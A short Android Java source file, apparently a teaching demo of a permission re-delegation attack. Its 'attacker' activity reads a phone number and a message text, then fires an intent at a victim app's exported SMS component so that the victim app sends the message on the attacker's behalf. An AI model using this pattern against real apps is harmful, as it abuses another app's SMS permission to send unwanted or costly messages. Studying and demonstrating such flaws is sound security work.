package victim.rede.perm.prattacker;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class AttackerMainActivity extends AppCompatActivity implements View.OnClickListener {

    EditText mNUM, mINFO;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attacker_main);
        mNUM = (EditText) findViewById(R.id.num_attack);
        mINFO = (EditText) findViewById(R.id.info_attack);
        Button btn = (Button) findViewById(R.id.click_attack);
        btn.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        Intent intent = new Intent("victim.rede.perm.prvictim.sms");
        intent.putExtra("num", mNUM.getText().toString());
        intent.putExtra("info", mINFO.getText().toString());
        startActivity(intent);
    }
}
